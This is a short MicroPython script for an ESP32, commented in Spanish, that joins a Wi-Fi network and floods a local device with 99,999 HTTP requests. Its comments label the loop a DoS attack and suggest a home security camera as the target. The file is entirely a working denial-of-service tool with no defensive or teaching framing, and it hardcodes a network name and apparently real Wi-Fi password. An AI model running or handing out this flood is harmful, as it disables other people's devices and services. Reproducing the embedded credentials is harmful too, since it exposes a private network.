import network
import urequests

# Configura la conexión Wi-Fi en la ESP32
ssid = 'INFINITUM921E_2.4'
password = 'f59FwxQkib'
sta_if = network.WLAN(network.STA_IF)
sta_if.active(True)
sta_if.connect(ssid, password)

# Dirección IP del dispositivo objetivo en la red local
target_ip = '192.168.1.10'  # Por ejemplo, la dirección IP de una cámara de seguridad en tu red local

# Número de solicitudes a enviar
num_requests = 99999

# Realiza el ataque DoS
for i in range(num_requests):
    try:
        response = urequests.get('http://' + target_ip)
        print('Solicitud {} enviada'.format(i+1))
    except Exception as e:
        print('Error al enviar la solicitud:', e)